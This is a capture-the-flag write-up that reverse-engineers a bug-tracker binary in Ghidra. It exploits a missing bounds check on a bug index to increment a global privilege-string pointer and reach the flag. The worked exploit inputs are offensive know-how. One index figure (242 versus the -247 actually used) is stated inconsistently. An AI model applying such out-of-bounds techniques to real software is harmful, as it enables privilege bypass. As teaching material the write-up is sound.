# ZeroGravity

## Introduction

The challenge can be accessed remotely using:

```
nc provinggrounds.sas.hackthe.space 13337
```

The files present in the remote environment can be downloaded for analysis and local exploit development. The real exploit has to be executed against the remote environment, which contains a `flag.txt` that contains the flag.

There is only one file present in the download: `binary0`, which appears to be the executable. A quick inspection reveals:

```
$ file binary0
binary0: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=77188945d5a89ca0c9085b5da5c6d54fe57e670a, for GNU/Linux 3.2.0, not stripped

$ checksec --file=binary0
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   72 Symbols        No    0               5               binary0
```

PIE being enabled means not only the stack, but also the code and global data are loaded at randomized addresses. Absolute addresses inside the binary can't be relied on later - either leaks or purely relative techniques are needed, but the internal layout (relative offsets) stays constant between runs.

NX is enabled, marking the stack (and other data regions) as non-executable, which prevents classic "inject shellcode and jump to it" exploits but does not stop control-flow hijacking such as ROP or ret2libc. The stack canary means typical linear stack overflows overwriting the saved return address will usually be detected and cause an abort. In this challenge, however, the exploit ends up targeting a logic/heap/global-data issue instead, so both NX and the canary turn out not to be practical obstacles for the final exploit.

## Running the Binary

Running the binary locally shows a simple text-based main menu:

```
ZeroGravity proving grounds: Bugtracker

Please select an option 1-3:
1. Manage bugs
2. Administration area
3. Check privileges
>
```

### Administration area

Trying "Administration area" first:

```
> 2

You are not authorized

Please select an option 1-3:
1. Manage bugs
2. Administration area
3. Check privileges
>
```

Access is restricted and the program immediately returns to the main menu.

### Check privileges

```
> 3

Your current privilege level is: UNAUTHORIZED

Please select an option 1-3:
1. Manage bugs
2. Administration area
3. Check privileges
>
```

By default, the privilege level is the string `UNAUTHORIZED`, and the program keeps looping back to the main menu after each action.

### Manage bugs

```
> 1

Please select an option 1-4:
1. Add bug
2. Delete bug
3. Change bug severity
4. List bugs
5. Return to main menu
>
```

Adding a bug:

```
> 1

Enter a description (0-23 chars):
bug
Enter a severity (1-5):
3
```

Listing stored bugs:

```
> 4

ID: 0
Description: bug
Severity: 3
----------------------

Please select an option 1-4:
1. Add bug
2. Delete bug
3. Change bug severity
4. List bugs
5. Return to main menu
>
```

Changing the severity of this bug:

```
> 3

Which bug do you want to change?
ID: 0
Description: bug
Severity: 3
----------------------
0
Decrease or increase value?
(1) Increase
(0) Decrease
> 0
Severity has been changed to 2.

Please select an option 1-4:
1. Add bug
2. Delete bug
3. Change bug severity
4. List bugs
5. Return to main menu
> 4

ID: 0
Description: bug
Severity: 2
----------------------

Please select an option 1-4:
1. Add bug
2. Delete bug
3. Change bug severity
4. List bugs
5. Return to main menu
>
```

Deleting the bug and observing subsequent behavior:

```
> 2

Which bug do you want to delete? (Enter ID)
ID: 0
Description: bug
Severity: 2
----------------------
0
Bug index 0 deleted
```

After deletion, trying to change severity or list bugs reports the list is empty:

```
Please select an option 1-4:
1. Add bug
2. Delete bug
3. Change bug severity
4. List bugs
5. Return to main menu
> 3

List is empty.

Please select an option 1-4:
1. Add bug
2. Delete bug
3. Change bug severity
4. List bugs
5. Return to main menu
> 4

List is empty.

Please select an option 1-4:
1. Add bug
2. Delete bug
3. Change bug severity
4. List bugs
5. Return to main menu
>
```

Option 5 returns from the bug submenu back to the main menu, and the loop continues as before.

## Static Analysis in Ghidra

Loading `binary0` into Ghidra, the entry point shows a very small main wrapper:

```c
void main(EVP_PKEY_CTX *param_1)
{
  init(param_1);
  main_menu();
  return;
}
```

The program first calls `init` and then immediately enters `main_menu()`, matching the observed menu.

### Main menu dispatcher

```c
void main_menu(void)
{
  char cVar1;
  long in_FS_OFFSET;
  int local_14;
  undefined8 local_10;

  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  do {
    do {
      puts("\nPlease select an option 1-3:");
      puts("1. Manage bugs");
      puts("2. Administration area");
      puts("3. Check privileges");
      printf("> ");
      cVar1 = get_input(&local_14);
    } while (cVar1 != '\x01');
    putchar(10);
    if (local_14 == 3) {
      option_check_privileges();
    }
    else if (local_14 < 4) {
      if (local_14 == 1) {
        option_manage_todos();
      }
      else if (local_14 == 2) {
        option_admin_area();
      }
    }
  } while( true );
}
```

This matches the runtime behavior: the program loops forever, dispatching to `option_manage_todos()`, `option_admin_area()`, or `option_check_privileges()`.

### Administration area handler

```c
void option_admin_area(void)
{
  char cVar1;

  cVar1 = is_authorized();
  if (cVar1 == '\x01') {
    print_flag();
  }
  else {
    puts("You are not authorized");
  }
  return;
}
```

This calls `is_authorized()` and, based on its result, either prints "not authorized" or calls `print_flag()`. Access is gated purely by the result of `is_authorized()`:

```c
undefined8 is_authorized(void)

{
  int iVar1;
  undefined8 uVar2;

  iVar1 = strcmp(security_level,"UNAUTHORIZED");
  if (iVar1 == 0) {
    uVar2 = 0;
  }
  else {
    iVar1 = strcmp(security_level,"AUTHORIZED");
    if (iVar1 == 0) {
      uVar2 = 1;
    }
    else {
      uVar2 = 0;
    }
  }
  return uVar2;
}
```

There's a strict comparison for whether the string is `"UNAUTHORIZED"` or `"AUTHORIZED"`. Any other value automatically falls to `"UNAUTHORIZED"`.

### Check privileges handler

```c
void option_check_privileges(void)
{
  printf("Your current privilege level is: %s\n",security_level);
  return;
}
```

A global named `security_level` is used as a string pointer and printed directly. Inspecting the corresponding entry in Ghidra's memory view:

```
// secure_section  [0x4020 - 0x5ee0]
security_level                                  XREF: ...
        00104020 08 20 10 00 00 00 00 00        addr       s_UNAUTHORIZED_00102008

s_UNAUTHORIZED_00102008
        00102008 55 4e 41 55 54 48 4f 52 49 5a 45 44
                     "UNAUTHORIZED"
```

`security_level` is stored in a "secure_section" as a pointer that initially points to the static string `"UNAUTHORIZED"`, matching the runtime output.

### Flag-printing function

```c
void print_flag(void)
{
  FILE *__stream;
  long in_FS_OFFSET;
  char local_48 ;
  undefined8 local_10;

  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  local_48 = '\0';
  local_48 = '\0';
  ...
  local_48[0x2f] = '\0';
  local_48[0x30] = 0;
  __stream = fopen("./flag.txt","r");
  if (__stream == (FILE *)0x0) {
    fwrite("error reading flag",1,0x12,stderr);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  fgets(local_48,0x30,__stream);
  puts("Proving grounds successfully completed.");
  printf("%s",local_48);
  fclose(__stream);
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

This function initializes a local buffer, opens `./flag.txt` for reading, reads up to `0x30` bytes into the buffer, prints a success message, then prints the buffer contents and exits. The flag is read from a local `flag.txt` file and printed only when `print_flag()` is reached via normal control flow - meaning the plan is to change privileges and then access the administration area.

## Bug Management Logic

The "Manage bugs" menu dispatcher is `option_manage_todos`:

```c
void option_manage_todos(void)
{
  char cVar1;
  long in_FS_OFFSET;
  undefined4 local_14;
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  do {
    do {
      puts("\nPlease select an option 1-4:");
      puts("1. Add bug");
      puts("2. Delete bug");
      puts("3. Change bug severity");
      puts("4. List bugs");
      puts("5. Return to main menu");
      printf("> ");
      cVar1 = get_input(&local_14);
    } while (cVar1 != '\x01');
    putchar(10);
    switch(local_14) {
    case 1:
      option_add_bug();
      break;
    case 2:
      option_delete_bug();
      break;
    case 3:
      option_change_bug();
      break;
    case 4:
      option_list_bugs();
      break;
    case 5:
      if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return;
    }
  } while( true );
}
```

This mirrors the runtime behavior: it loops indefinitely, prints a five-option submenu, and calls one of four helper functions. Option 5 returns to the main menu with the usual canary check. No obvious vulnerability exists in this dispatcher itself; it just routes input.

### Adding bugs

```c
void option_add_bug(void)
{
  char cVar1;
  long in_FS_OFFSET;
  int local_40;
  int local_3c;
  char local_38 ;
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("Enter a description (0-23 chars):");
  local_38 = '\0';
  ...
  local_38[0x1f] = '\0';
  read_line(local_38,0x17);
  puts("Enter a severity (1-5):");
  cVar1 = get_input(&local_40);
  if (cVar1 == '\x01') {
    if ((local_40 < 1) || (5 < local_40)) {
      puts("Invalid severity");
    }
    else {
      for (local_3c = 0; local_3c < 10; local_3c = local_3c + 1) {
        if (*(long *)(bug_list + (long)local_3c * 0x20) == -1) {
          strncpy(bug_list + (long)local_3c * 0x20 + 8,local_38,0x18);
          *(long *)(bug_list + (long)local_3c * 0x20) = (long)local_40;
          puts("Bug added.");
          goto LAB_001016d6;
        }
      }
      puts("Bug list ist full.");
    }
  }
LAB_001016d6:
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return;
}
```

The function initializes a 40-byte local buffer for the bug description (`local_38`), clears it, and calls `read_line(local_38, 0x17)`. The size argument `0x17` (23) matches the "0–23 chars" description seen in the menu, so the description input is properly bounded. The severity is read into `local_40` and checked to be between 1 and 5. If valid, the code iterates over up to 10 entries in `bug_list`, looking for a free slot (`-1`), then:

- Copies up to `0x18` (24) bytes of the description into `bug_list + index * 0x20 + 8`.
- Stores the severity as a long at `bug_list + index * 0x20`.

The bounds checks here look solid, and the loop over 10 entries ensures it doesn't write past the intended maximum number of bugs.

### Deleting bugs

```c
void option_delete_bug(void)
{
  char cVar1;
  long in_FS_OFFSET;
  uint local_14;
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  cVar1 = is_list_empty();
  if (cVar1 == '\0') {
    puts("Which bug do you want to delete? (Enter ID)");
    list_bugs();
    cVar1 = get_input(&local_14);
    if (cVar1 == '\x01') {
      if (((int)local_14 < 0) || (9 < (int)local_14)) {
        puts("Invalid index");
      }
      else if (*(long *)(bug_list + (long)(int)local_14 * 0x20) == -1) {
        puts("Index already free");
      }
      else {
        *(undefined8 *)(bug_list + (long)(int)local_14 * 0x20) = 0xffffffffffffffff;
        memset(bug_list + (long)(int)local_14 * 0x20 + 8,0,0x18);
        *(undefined4 *)(bug_list + (long)(int)local_14 * 0x20 + 8) = 0x6c6c756e;
        printf("Bug index %d deleted\n",(ulong)local_14);
      }
    }
  }
  else {
    puts("List is empty.");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return;
}
```

The code first checks if the bug list is empty via `is_list_empty()`. If not, it prompts for an ID and reads the index into `local_14`. Unlike the previous function, this one explicitly validates that the index is between 0 and 9:

- Out-of-range index → "Invalid index".
- Already-free slot → "Index already free".
- Otherwise, marks the slot free, zeroes the description, writes a marker string ("null" reversed).

`option_delete_bug` has proper bounds checking on the bug index and does not allow out-of-range access to `bug_list`.

### Changing bug severity - the vulnerable part

```c
void option_change_bug(void)
{
  char cVar1;
  long in_FS_OFFSET;
  int local_18;
  int local_14;
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  cVar1 = is_list_empty();
  if (cVar1 == '\0') {
    puts("Which bug do you want to change?");
    list_bugs();
    cVar1 = get_input(&local_18);
    if (cVar1 == '\x01') {
      if (*(long *)(bug_list + (long)local_18 * 0x20) == -1) {
        puts("No active bug with this index");
      }
      else {
        printf("Decrease or increase value?\n(1) Increase\n(0) Decrease\n> ");
        cVar1 = get_input(&local_14);
        if (cVar1 == '\x01') {
          if (local_14 == 1) {
            if (*(long *)(bug_list + (long)local_18 * 0x20) == 5) {
              puts("Severity already at its maximum value.");
            }
            else {
              *(long *)(bug_list + (long)local_18 * 0x20) =
                   *(long *)(bug_list + (long)local_18 * 0x20) + 1;
              printf("Severity has been changed to %ld.\n",
                     *(undefined8 *)(bug_list + (long)local_18 * 0x20));
            }
          }
          else if (local_14 == 0) {
            if (*(long *)(bug_list + (long)local_18 * 0x20) == 1) {
              puts("Severity already at its minimum value.");
            }
            else {
              *(long *)(bug_list + (long)local_18 * 0x20) =
                   *(long *)(bug_list + (long)local_18 * 0x20) + -1;
              printf("Severity has been changed to %ld.\n",
                     *(undefined8 *)(bug_list + (long)local_18 * 0x20));
            }
          }
        }
      }
    }
  }
  else {
    puts("List is empty.");
  }
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
  __stack_chk_fail();
}
```

The function logic:

1. Check if the list is empty.
2. Print all current bugs.
3. Ask which bug ID to change, reading into `local_18` via `get_input`.
4. If the slot's first long is `-1`, print "No active bug with this index".
5. Otherwise, ask to increase/decrease severity and adjust the long at `bug_list + local_18 * 0x20`, enforcing min 1 / max 5.

The crucial difference from `option_delete_bug` is that **there is no bounds check on `local_18`**. It's used directly in pointer arithmetic:

```c
*(long *)(bug_list + (long)local_18 * 0x20)
```

without ensuring `local_18` is in range `[0, 9]`. Arbitrary values - including negatives or values greater than 9 - are accepted, and the program still computes an address and reads/writes through it.

This can be confirmed at runtime with a negative index:

```
> 3

Which bug do you want to change?
ID: 0
Description: hello
Severity: 2
----------------------
-10
Decrease or increase value?
(1) Increase
(0) Decrease
> 0
Severity has been changed to 4055906437012019283.

Please select an option 1-4:
1. Add bug
2. Delete bug
3. Change bug severity
4. List bugs
5. Return to main menu
>
```

Entering `-10` as the bug ID, the function computes `bug_list + (-10) * 0x20` and performs the decrement. The resulting "severity" is a large 64-bit number, clearly outside the normal 1–5 range, confirming reads/writes outside the intended bug array.

`option_change_bug` provides an **out-of-bounds read/write primitive** on `bug_list` in 32-byte steps, both forward and backward in memory, controlled by the signed index `local_18`. This is the core vulnerability used for exploitation.

## Memory Layout: Targeting `security_level`

Ghidra shows a dedicated section for bug storage:

```
//
// bug_list_section 
// SHT_PROGBITS  [0x5f00 - 0x603f]
// ram:00105f00-ram:0010603f
//
bug_list                                     XREF[...]:
        00105f00 ff ff ff ff ff ff ff ff 6e ...
```

`bug_list` starts at `0x105f00`. In `option_change_bug`, entries are always accessed via:

```c
(long *)(bug_list + (long)local_18 * 0x20)
```

This means, via the bug ID `local_18`, only memory locations whose distance from `bug_list`'s start is a multiple of `0x20` (32) bytes can be reached. In other words, any reachable address must satisfy:

\[ (address - 0x105f00) \bmod 32 = 0 \]

Checking the address of `security_level` and computing the difference from `bug_list`'s start, the difference turns out to be divisible by 32, and dividing by 32 gives 242. Using an index of `-242` (or `-247` in the actual testing setup) makes the write in `option_change_bug` land exactly on the long value that influences `security_level`.

Debugging reveals this long contains a pointer into the string `"UNAUTHORIZED"`, initially pointing to the `'U'`. Incrementing this pointer value twice moves it forward by two bytes, pointing to `'A'` instead - effectively changing what is read as the current privilege string.

These controlled increments are triggered via the menu using a negative bug index:

```
> 3

Which bug do you want to change?
ID: 0
Description: hello
Severity: 2
----------------------
-247
Decrease or increase value?
(1) Increase
(0) Decrease
> 1
Severity has been changed to 94468580909065.

Please select an option 1-4:
1. Add bug
2. Delete bug
3. Change bug severity
4. List bugs
5. Return to main menu
> 3

Which bug do you want to change?
ID: 0
Description: hello
Severity: 2
----------------------
-247
Decrease or increase value?
(1) Increase
(0) Decrease
> 1
Severity has been changed to 94468580909066.
```

Using index `-247` twice with "Increase" performs `+1` on the 64-bit value at the targeted address each time, effectively advancing the pointer by one byte. After these increments, the pointer no longer starts at the original `'U'` of `"UNAUTHORIZED"`, but at a later character - changing how the privilege string is interpreted and moving from the initial unauthorized state to a higher privilege level.

## Getting the Flag

Returning to the main menu and selecting the Administration area now yields the flag:

```
Please select an option 1-3:
Manage bugs
Administration area
Check privileges
2
Proving grounds successfully completed. FLG{XXXX_XXX_XXXXXX_XXXXXX}
```

(Flag censored - everything else is exact output.)
